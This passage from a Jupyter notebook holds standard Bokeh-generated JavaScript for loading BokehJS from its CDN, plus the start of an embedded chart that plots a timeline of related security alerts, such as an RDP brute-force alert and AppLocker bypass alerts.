       "      });\n",
       "      // Destroy server and session\n",
       "      var cmd = \"import bokeh.io.notebook as ion; ion.destroy_server('\" + server_id + \"')\";\n",
       "      cell.notebook.kernel.execute(cmd);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  /**\n",
       "   * Handle when a new output is added\n",
       "   */\n",
       "  function handleAddOutput(event, handle) {\n",
       "    var output_area = handle.output_area;\n",
       "    var output = handle.output;\n",
       "\n",
       "    // limit handleAddOutput to display_data with EXEC_MIME_TYPE content only\n",
       "    if ((output.output_type != \"display_data\") || (!output.data.hasOwnProperty(EXEC_MIME_TYPE))) {\n",
       "      return\n",
       "    }\n",
       "\n",
       "    var toinsert = output_area.element.find(\".\" + CLASS_NAME.split(' ')[0]);\n",
       "\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"id\"] !== undefined) {\n",
       "      toinsert[toinsert.length - 1].firstChild.textContent = output.data[JS_MIME_TYPE];\n",
       "      // store reference to embed id on output_area\n",
       "      output_area._bokeh_element_id = output.metadata[EXEC_MIME_TYPE][\"id\"];\n",
       "    }\n",
       "    if (output.metadata[EXEC_MIME_TYPE][\"server_id\"] !== undefined) {\n",
       "      var bk_div = document.createElement(\"div\");\n",
       "      bk_div.innerHTML = output.data[HTML_MIME_TYPE];\n",
       "      var script_attrs = bk_div.children[0].attributes;\n",
       "      for (var i = 0; i < script_attrs.length; i++) {\n",
       "        toinsert[toinsert.length - 1].firstChild.setAttribute(script_attrs[i].name, script_attrs[i].value);\n",
       "        toinsert[toinsert.length - 1].firstChild.textContent = bk_div.children[0].textContent\n",
       "      }\n",
       "      // store reference to server id on output_area\n",
       "      output_area._bokeh_server_id = output.metadata[EXEC_MIME_TYPE][\"server_id\"];\n",
       "    }\n",
       "  }\n",
       "\n",
       "  function register_renderer(events, OutputArea) {\n",
       "\n",
       "    function append_mime(data, metadata, element) {\n",
       "      // create a DOM node to render to\n",
       "      var toinsert = this.create_output_subarea(\n",
       "        metadata,\n",
       "        CLASS_NAME,\n",
       "        EXEC_MIME_TYPE\n",
       "      );\n",
       "      this.keyboard_manager.register_events(toinsert);\n",
       "      // Render to node\n",
       "      var props = {data: data, metadata: metadata[EXEC_MIME_TYPE]};\n",
       "      render(props, toinsert[toinsert.length - 1]);\n",
       "      element.append(toinsert);\n",
       "      return toinsert\n",
       "    }\n",
       "\n",
       "    /* Handle when an output is cleared or removed */\n",
       "    events.on('clear_output.CodeCell', handleClearOutput);\n",
       "    events.on('delete.Cell', handleClearOutput);\n",
       "\n",
       "    /* Handle when a new output is added */\n",
       "    events.on('output_added.OutputArea', handleAddOutput);\n",
       "\n",
       "    /**\n",
       "     * Register the mime type and append_mime function with output_area\n",
       "     */\n",
       "    OutputArea.prototype.register_mime_type(EXEC_MIME_TYPE, append_mime, {\n",
       "      /* Is output safe? */\n",
       "      safe: true,\n",
       "      /* Index of renderer in `output_area.display_order` */\n",
       "      index: 0\n",
       "    });\n",
       "  }\n",
       "\n",
       "  // register the mime type if in Jupyter Notebook environment and previously unregistered\n",
       "  if (root.Jupyter !== undefined) {\n",
       "    var events = require('base/js/events');\n",
       "    var OutputArea = require('notebook/js/outputarea').OutputArea;\n",
       "\n",
       "    if (OutputArea.prototype.mime_types().indexOf(EXEC_MIME_TYPE) == -1) {\n",
       "      register_renderer(events, OutputArea);\n",
       "    }\n",
       "  }\n",
       "\n",
       "  \n",
       "  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n",
       "    root._bokeh_timeout = Date.now() + 5000;\n",
       "    root._bokeh_failed_load = false;\n",
       "  }\n",
       "\n",
       "  var NB_LOAD_WARNING = {'data': {'text/html':\n",
       "     \"<div style='background-color: #fdd'>\\n\"+\n",
       "     \"<p>\\n\"+\n",
       "     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n",
       "     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n",
       "     \"</p>\\n\"+\n",
       "     \"<ul>\\n\"+\n",
       "     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n",
       "     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n",
       "     \"</ul>\\n\"+\n",
       "     \"<code>\\n\"+\n",
       "     \"from bokeh.resources import INLINE\\n\"+\n",
       "     \"output_notebook(resources=INLINE)\\n\"+\n",
       "     \"</code>\\n\"+\n",
       "     \"</div>\"}};\n",
       "\n",
       "  function display_loaded() {\n",
       "    var el = document.getElementById(\"4479\");\n",
       "    if (el != null) {\n",
       "      el.textContent = \"BokehJS is loading...\";\n",
       "    }\n",
       "    if (root.Bokeh !== undefined) {\n",
       "      if (el != null) {\n",
       "        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n",
       "      }\n",
       "    } else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(display_loaded, 100)\n",
       "    }\n",
       "  }\n",
       "\n",
       "\n",
       "  function run_callbacks() {\n",
       "    try {\n",
       "      root._bokeh_onload_callbacks.forEach(function(callback) {\n",
       "        if (callback != null)\n",
       "          callback();\n",
       "      });\n",
       "    } finally {\n",
       "      delete root._bokeh_onload_callbacks\n",
       "    }\n",
       "    console.debug(\"Bokeh: all callbacks have finished\");\n",
       "  }\n",
       "\n",
       "  function load_libs(css_urls, js_urls, callback) {\n",
       "    if (css_urls == null) css_urls = [];\n",
       "    if (js_urls == null) js_urls = [];\n",
       "\n",
       "    root._bokeh_onload_callbacks.push(callback);\n",
       "    if (root._bokeh_is_loading > 0) {\n",
       "      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n",
       "      return null;\n",
       "    }\n",
       "    if (js_urls == null || js_urls.length === 0) {\n",
       "      run_callbacks();\n",
       "      return null;\n",
       "    }\n",
       "    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n",
       "    root._bokeh_is_loading = css_urls.length + js_urls.length;\n",
       "\n",
       "    function on_load() {\n",
       "      root._bokeh_is_loading--;\n",
       "      if (root._bokeh_is_loading === 0) {\n",
       "        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n",
       "        run_callbacks()\n",
       "      }\n",
       "    }\n",
       "\n",
       "    function on_error() {\n",
       "      console.error(\"failed to load \" + url);\n",
       "    }\n",
       "\n",
       "    for (var i = 0; i < css_urls.length; i++) {\n",
       "      var url = css_urls[i];\n",
       "      const element = document.createElement(\"link\");\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.rel = \"stylesheet\";\n",
       "      element.type = \"text/css\";\n",
       "      element.href = url;\n",
       "      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n",
       "      document.body.appendChild(element);\n",
       "    }\n",
       "\n",
       "    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n",
       "\n",
       "    for (var i = 0; i < js_urls.length; i++) {\n",
       "      var url = js_urls[i];\n",
       "      var element = document.createElement('script');\n",
       "      element.onload = on_load;\n",
       "      element.onerror = on_error;\n",
       "      element.async = false;\n",
       "      element.src = url;\n",
       "      if (url in hashes) {\n",
       "        element.crossOrigin = \"anonymous\";\n",
       "        element.integrity = \"sha384-\" + hashes[url];\n",
       "      }\n",
       "      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n",
       "      document.head.appendChild(element);\n",
       "    }\n",
       "  };\n",
       "\n",
       "  function inject_raw_css(css) {\n",
       "    const element = document.createElement(\"style\");\n",
       "    element.appendChild(document.createTextNode(css));\n",
       "    document.body.appendChild(element);\n",
       "  }\n",
       "\n",
       "  \n",
       "  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n",
       "  var css_urls = [];\n",
       "  \n",
       "\n",
       "  var inline_js = [\n",
       "    function(Bokeh) {\n",
       "      Bokeh.set_log_level(\"info\");\n",
       "    },\n",
       "    function(Bokeh) {\n",
       "    \n",
       "    \n",
       "    }\n",
       "  ];\n",
       "\n",
       "  function run_inline_js() {\n",
       "    \n",
       "    if (root.Bokeh !== undefined || force === true) {\n",
       "      \n",
       "    for (var i = 0; i < inline_js.length; i++) {\n",
       "      inline_js[i].call(root, root.Bokeh);\n",
       "    }\n",
       "    if (force === true) {\n",
       "        display_loaded();\n",
       "      }} else if (Date.now() < root._bokeh_timeout) {\n",
       "      setTimeout(run_inline_js, 100);\n",
       "    } else if (!root._bokeh_failed_load) {\n",
       "      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n",
       "      root._bokeh_failed_load = true;\n",
       "    } else if (force !== true) {\n",
       "      var cell = $(document.getElementById(\"4479\")).parents('.cell').data().cell;\n",
       "      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n",
       "    }\n",
       "\n",
       "  }\n",
       "\n",
       "  if (root._bokeh_is_loading === 0) {\n",
       "    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n",
       "    run_inline_js();\n",
       "  } else {\n",
       "    load_libs(css_urls, js_urls, function() {\n",
       "      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n",
       "      run_inline_js();\n",
       "    });\n",
       "  }\n",
       "}(window));"
      ],
      "application/vnd.bokehjs_load.v0+json": "\n(function(root) {\n  function now() {\n    return new Date();\n  }\n\n  var force = true;\n\n  if (typeof root._bokeh_onload_callbacks === \"undefined\" || force === true) {\n    root._bokeh_onload_callbacks = [];\n    root._bokeh_is_loading = undefined;\n  }\n\n  \n\n  \n  if (typeof (root._bokeh_timeout) === \"undefined\" || force === true) {\n    root._bokeh_timeout = Date.now() + 5000;\n    root._bokeh_failed_load = false;\n  }\n\n  var NB_LOAD_WARNING = {'data': {'text/html':\n     \"<div style='background-color: #fdd'>\\n\"+\n     \"<p>\\n\"+\n     \"BokehJS does not appear to have successfully loaded. If loading BokehJS from CDN, this \\n\"+\n     \"may be due to a slow or bad network connection. Possible fixes:\\n\"+\n     \"</p>\\n\"+\n     \"<ul>\\n\"+\n     \"<li>re-rerun `output_notebook()` to attempt to load from CDN again, or</li>\\n\"+\n     \"<li>use INLINE resources instead, as so:</li>\\n\"+\n     \"</ul>\\n\"+\n     \"<code>\\n\"+\n     \"from bokeh.resources import INLINE\\n\"+\n     \"output_notebook(resources=INLINE)\\n\"+\n     \"</code>\\n\"+\n     \"</div>\"}};\n\n  function display_loaded() {\n    var el = document.getElementById(\"4479\");\n    if (el != null) {\n      el.textContent = \"BokehJS is loading...\";\n    }\n    if (root.Bokeh !== undefined) {\n      if (el != null) {\n        el.textContent = \"BokehJS \" + root.Bokeh.version + \" successfully loaded.\";\n      }\n    } else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(display_loaded, 100)\n    }\n  }\n\n\n  function run_callbacks() {\n    try {\n      root._bokeh_onload_callbacks.forEach(function(callback) {\n        if (callback != null)\n          callback();\n      });\n    } finally {\n      delete root._bokeh_onload_callbacks\n    }\n    console.debug(\"Bokeh: all callbacks have finished\");\n  }\n\n  function load_libs(css_urls, js_urls, callback) {\n    if (css_urls == null) css_urls = [];\n    if (js_urls == null) js_urls = [];\n\n    root._bokeh_onload_callbacks.push(callback);\n    if (root._bokeh_is_loading > 0) {\n      console.debug(\"Bokeh: BokehJS is being loaded, scheduling callback at\", now());\n      return null;\n    }\n    if (js_urls == null || js_urls.length === 0) {\n      run_callbacks();\n      return null;\n    }\n    console.debug(\"Bokeh: BokehJS not loaded, scheduling load and callback at\", now());\n    root._bokeh_is_loading = css_urls.length + js_urls.length;\n\n    function on_load() {\n      root._bokeh_is_loading--;\n      if (root._bokeh_is_loading === 0) {\n        console.debug(\"Bokeh: all BokehJS libraries/stylesheets loaded\");\n        run_callbacks()\n      }\n    }\n\n    function on_error() {\n      console.error(\"failed to load \" + url);\n    }\n\n    for (var i = 0; i < css_urls.length; i++) {\n      var url = css_urls[i];\n      const element = document.createElement(\"link\");\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.rel = \"stylesheet\";\n      element.type = \"text/css\";\n      element.href = url;\n      console.debug(\"Bokeh: injecting link tag for BokehJS stylesheet: \", url);\n      document.body.appendChild(element);\n    }\n\n    const hashes = {\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\": \"kLr4fYcqcSpbuI95brIH3vnnYCquzzSxHPU6XGQCIkQRGJwhg0StNbj1eegrHs12\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\": \"xIGPmVtaOm+z0BqfSOMn4lOR6ciex448GIKG4eE61LsAvmGj48XcMQZtKcE/UXZe\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\": \"Dc9u1wF/0zApGIWoBbH77iWEHtdmkuYWG839Uzmv8y8yBLXebjO9ZnERsde5Ln/P\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\": \"cT9JaBz7GiRXdENrJLZNSC6eMNF3nh3fa5fTF51Svp+ukxPdwcU5kGXGPBgDCa2j\"};\n\n    for (var i = 0; i < js_urls.length; i++) {\n      var url = js_urls[i];\n      var element = document.createElement('script');\n      element.onload = on_load;\n      element.onerror = on_error;\n      element.async = false;\n      element.src = url;\n      if (url in hashes) {\n        element.crossOrigin = \"anonymous\";\n        element.integrity = \"sha384-\" + hashes[url];\n      }\n      console.debug(\"Bokeh: injecting script tag for BokehJS library: \", url);\n      document.head.appendChild(element);\n    }\n  };\n\n  function inject_raw_css(css) {\n    const element = document.createElement(\"style\");\n    element.appendChild(document.createTextNode(css));\n    document.body.appendChild(element);\n  }\n\n  \n  var js_urls = [\"https://cdn.bokeh.org/bokeh/release/bokeh-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-widgets-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-tables-2.1.1.min.js\", \"https://cdn.bokeh.org/bokeh/release/bokeh-gl-2.1.1.min.js\"];\n  var css_urls = [];\n  \n\n  var inline_js = [\n    function(Bokeh) {\n      Bokeh.set_log_level(\"info\");\n    },\n    function(Bokeh) {\n    \n    \n    }\n  ];\n\n  function run_inline_js() {\n    \n    if (root.Bokeh !== undefined || force === true) {\n      \n    for (var i = 0; i < inline_js.length; i++) {\n      inline_js[i].call(root, root.Bokeh);\n    }\n    if (force === true) {\n        display_loaded();\n      }} else if (Date.now() < root._bokeh_timeout) {\n      setTimeout(run_inline_js, 100);\n    } else if (!root._bokeh_failed_load) {\n      console.log(\"Bokeh: BokehJS failed to load within specified timeout.\");\n      root._bokeh_failed_load = true;\n    } else if (force !== true) {\n      var cell = $(document.getElementById(\"4479\")).parents('.cell').data().cell;\n      cell.output_area.append_execute_result(NB_LOAD_WARNING)\n    }\n\n  }\n\n  if (root._bokeh_is_loading === 0) {\n    console.debug(\"Bokeh: BokehJS loaded, going straight to plotting\");\n    run_inline_js();\n  } else {\n    load_libs(css_urls, js_urls, function() {\n      console.debug(\"Bokeh: BokehJS plotting callback run at\", now());\n      run_inline_js();\n    });\n  }\n}(window));"
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "\n",
       "  <div class=\"bk-root\" id=\"e3eac0c0-4263-4fde-8b9b-77148947ba48\" data-root-id=\"4550\"></div>\n"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/javascript": [
       "(function(root) {\n",
       "  function embed_document(root) {\n",
       "    \n",
       "  var docs_json = {\"998cf92c-6729-4ba7-b5a9-315779fa1145\":{\"roots\":{\"references\":[{\"attributes\":{\"children\":[{\"id\":\"4482\"},{\"id\":\"4514\"}]},\"id\":\"4550\",\"type\":\"Column\"},{\"attributes\":{\"axis\":{\"id\":\"4497\"},\"dimension\":1,\"grid_line_color\":null,\"ticker\":null},\"id\":\"4500\",\"type\":\"Grid\"},{\"attributes\":{\"below\":[{\"id\":\"4525\"},{\"id\":\"4530\"}],\"center\":[{\"id\":\"4528\"}],\"plot_height\":120,\"plot_width\":900,\"renderers\":[{\"id\":\"4536\"}],\"title\":{\"id\":\"4515\"},\"toolbar\":{\"id\":\"4529\"},\"toolbar_location\":null,\"x_range\":{\"id\":\"4517\"},\"x_scale\":{\"id\":\"4521\"},\"y_range\":{\"id\":\"4519\"},\"y_scale\":{\"id\":\"4523\"}},\"id\":\"4514\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"4491\",\"type\":\"LinearScale\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":{\"id\":\"4538\"},\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4538\"}]},\"id\":\"4529\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"4558\",\"type\":\"UnionRenderers\"},{\"attributes\":{\"data_source\":{\"id\":\"4480\"},\"glyph\":{\"id\":\"4546\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4547\"},\"selection_glyph\":null,\"view\":{\"id\":\"4549\"}},\"id\":\"4548\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"4583\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"4584\",\"type\":\"YearsTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"4580\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"source\":{\"id\":\"4480\"}},\"id\":\"4537\",\"type\":\"CDSView\"},{\"attributes\":{},\"id\":\"4559\",\"type\":\"Selection\"},{\"attributes\":{\"bottom_units\":\"screen\",\"fill_alpha\":0.5,\"fill_color\":\"lightgrey\",\"left_units\":\"screen\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[4,4],\"line_width\":2,\"right_units\":\"screen\",\"top_units\":\"screen\"},\"id\":\"4506\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"fill_alpha\":0.2,\"fill_color\":\"navy\",\"level\":\"overlay\",\"line_alpha\":1.0,\"line_color\":\"black\",\"line_dash\":[2,2],\"line_width\":0.5},\"id\":\"4539\",\"type\":\"BoxAnnotation\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"4582\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"TimeGenerated\",\"@TimeGenerated\"],[\"AlertName\",\"@AlertName\"]]},\"id\":\"4481\",\"type\":\"HoverTool\"},{\"attributes\":{\"formatter\":{\"id\":\"4531\"},\"ticker\":{\"id\":\"4526\"}},\"id\":\"4525\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"4560\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"4581\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"4561\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4501\",\"type\":\"WheelZoomTool\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"4563\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,1,2,3,4,5,6,7,8,9,10,11]},\"id\":\"4567\",\"type\":\"MonthsTicker\"},{\"attributes\":{},\"id\":\"4489\",\"type\":\"LinearScale\"},{\"attributes\":{\"months\":[0,2,4,6,8,10]},\"id\":\"4568\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"4578\",\"type\":\"DaysTicker\"},{\"attributes\":{\"dimensions\":\"width\"},\"id\":\"4505\",\"type\":\"PanTool\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"4564\",\"type\":\"DaysTicker\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"4543\"},\"ticker\":{\"id\":\"4494\"}},\"id\":\"4493\",\"type\":\"DatetimeAxis\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"4566\",\"type\":\"DaysTicker\"},{\"attributes\":{\"months\":[0,6]},\"id\":\"4570\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,8,15,22]},\"id\":\"4565\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"4504\",\"type\":\"SaveTool\"},{\"attributes\":{},\"id\":\"4498\",\"type\":\"BasicTicker\"},{\"attributes\":{\"source\":{\"id\":\"4480\"}},\"id\":\"4549\",\"type\":\"CDSView\"},{\"attributes\":{\"num_minor_ticks\":10,\"tickers\":[{\"id\":\"4560\"},{\"id\":\"4561\"},{\"id\":\"4562\"},{\"id\":\"4563\"},{\"id\":\"4564\"},{\"id\":\"4565\"},{\"id\":\"4566\"},{\"id\":\"4567\"},{\"id\":\"4568\"},{\"id\":\"4569\"},{\"id\":\"4570\"},{\"id\":\"4571\"}]},\"id\":\"4494\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"overlay\":{\"id\":\"4539\"},\"x_range\":{\"id\":\"4485\"},\"y_range\":null},\"id\":\"4538\",\"type\":\"RangeTool\"},{\"attributes\":{\"active_drag\":\"auto\",\"active_inspect\":\"auto\",\"active_multi\":null,\"active_scroll\":\"auto\",\"active_tap\":\"auto\",\"tools\":[{\"id\":\"4481\"},{\"id\":\"4501\"},{\"id\":\"4502\"},{\"id\":\"4503\"},{\"id\":\"4504\"},{\"id\":\"4505\"}]},\"id\":\"4507\",\"type\":\"Toolbar\"},{\"attributes\":{},\"id\":\"4523\",\"type\":\"LinearScale\"},{\"attributes\":{\"formatter\":{\"id\":\"4553\"},\"ticker\":{\"id\":\"4498\"},\"visible\":false},\"id\":\"4497\",\"type\":\"LinearAxis\"},{\"attributes\":{\"months\":[0,4,8]},\"id\":\"4569\",\"type\":\"MonthsTicker\"},{\"attributes\":{\"days\":[1,15]},\"id\":\"4579\",\"type\":\"DaysTicker\"},{\"attributes\":{\"overlay\":{\"id\":\"4506\"}},\"id\":\"4502\",\"type\":\"BoxZoomTool\"},{\"attributes\":{\"text\":\"Timeline: Related Alerts\"},\"id\":\"4483\",\"type\":\"Title\"},{\"attributes\":{\"axis\":{\"id\":\"4493\"},\"minor_grid_line_alpha\":0.3,\"minor_grid_line_color\":\"navy\",\"ticker\":null},\"id\":\"4496\",\"type\":\"Grid\"},{\"attributes\":{},\"id\":\"4553\",\"type\":\"BasicTickFormatter\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"4577\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"4571\",\"type\":\"YearsTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.5},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.5},\"line_color\":{\"value\":\"navy\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"4546\",\"type\":\"Diamond\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"size\":{\"units\":\"screen\",\"value\":10},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"4547\",\"type\":\"Diamond\"},{\"attributes\":{\"fill_color\":{\"value\":\"navy\"},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"4534\",\"type\":\"Circle\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"4531\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"text\":\"Range Selector\"},\"id\":\"4515\",\"type\":\"Title\"},{\"attributes\":{\"align\":\"right\",\"text\":\"Drag the middle or edges of the selection box to change the range in the main chart\",\"text_font_size\":{\"value\":\"10px\"}},\"id\":\"4530\",\"type\":\"Title\"},{\"attributes\":{\"days\":[\"%m-%d %H:%M\"],\"hours\":[\"%H:%M:%S\"],\"milliseconds\":[\"%H:%M:%S.%3N\"],\"minutes\":[\"%H:%M:%S\"],\"seconds\":[\"%H:%M:%S\"]},\"id\":\"4543\",\"type\":\"DatetimeTickFormatter\"},{\"attributes\":{\"below\":[{\"id\":\"4493\"}],\"center\":[{\"id\":\"4496\"},{\"id\":\"4500\"}],\"left\":[{\"id\":\"4497\"}],\"min_border_left\":50,\"plot_height\":200,\"plot_width\":900,\"renderers\":[{\"id\":\"4548\"}],\"title\":{\"id\":\"4483\"},\"toolbar\":{\"id\":\"4507\"},\"x_range\":{\"id\":\"4485\"},\"x_scale\":{\"id\":\"4489\"},\"y_range\":{\"id\":\"4487\"},\"y_scale\":{\"id\":\"4491\"}},\"id\":\"4482\",\"subtype\":\"Figure\",\"type\":\"Plot\"},{\"attributes\":{},\"id\":\"4521\",\"type\":\"LinearScale\"},{\"attributes\":{},\"id\":\"4503\",\"type\":\"ResetTool\"},{\"attributes\":{\"data\":{\"AlertName\":[\"RDP Brute Force\",\"Potential attempt to bypass AppLocker detected\",\"Potential attempt to bypass AppLocker detected\"],\"TimeGenerated\":{\"__ndarray__\":\"AACuUbsyd0IAAJ1FujJ3QgAAnUW6MndC\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[3]},\"index\":[0,1,2],\"y_index\":[0,0,0]},\"selected\":{\"id\":\"4559\"},\"selection_policy\":{\"id\":\"4558\"}},\"id\":\"4480\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"mantissas\":[1,2,5],\"max_interval\":500.0,\"num_minor_ticks\":0},\"id\":\"4573\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"fill_alpha\":{\"value\":0.1},\"fill_color\":{\"value\":\"navy\"},\"line_alpha\":{\"value\":0.1},\"line_color\":{\"value\":\"navy\"},\"x\":{\"field\":\"TimeGenerated\"},\"y\":{\"field\":\"y_index\"}},\"id\":\"4535\",\"type\":\"Circle\"},{\"attributes\":{\"data_source\":{\"id\":\"4480\"},\"glyph\":{\"id\":\"4534\"},\"hover_glyph\":null,\"muted_glyph\":null,\"nonselection_glyph\":{\"id\":\"4535\"},\"selection_glyph\":null,\"view\":{\"id\":\"4537\"}},\"id\":\"4536\",\"type\":\"GlyphRenderer\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"4562\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"start\":-1.0},\"id\":\"4487\",\"type\":\"Range1d\"},{\"attributes\":{\"base\":60,\"mantissas\":[1,2,5,10,15,20,30],\"max_interval\":1800000.0,\"min_interval\":1000.0,\"num_minor_ticks\":0},\"id\":\"4574\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{\"days\":[1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]},\"id\":\"4576\",\"type\":\"DaysTicker\"},{\"attributes\":{\"base\":24,\"mantissas\":[1,2,4,6,8,12],\"max_interval\":43200000.0,\"min_interval\":3600000.0,\"num_minor_ticks\":0},\"id\":\"4575\",\"type\":\"AdaptiveTicker\"},{\"attributes\":{},\"id\":\"4519\",\"type\":\"DataRange1d\"},{\"attributes\":{\"end\":1594166265800.0,\"start\":1594164948200.0},\"id\":\"4485\",\"type\":\"Range1d\"},{\"attributes\":{\"num_minor_ticks\":5,\"tickers\":[{\"id\":\"4573\"},{\"id\":\"4574\"},{\"id\":\"4575\"},{\"id\":\"4576\"},{\"id\":\"4577\"},{\"id\":\"4578\"},{\"id\":\"4579\"},{\"id\":\"4580\"},{\"id\":\"4581\"},{\"id\":\"4582\"},{\"id\":\"4583\"},{\"id\":\"4584\"}]},\"id\":\"4526\",\"type\":\"DatetimeTicker\"},{\"attributes\":{\"end\":1594166320700.0,\"start\":1594164893300.0},\"id\":\"4517\",\"type\":\"Range1d\"},{\"attributes\":{\"axis\":{\"id\":\"4525\"},\"ticker\":null},\"id\":\"4528\",\"type\":\"Grid\"}],\"root_ids\":[\"4550\"]},\"title\":\"Bokeh Application\",\"version\":\"2.1.1\"}};\n",
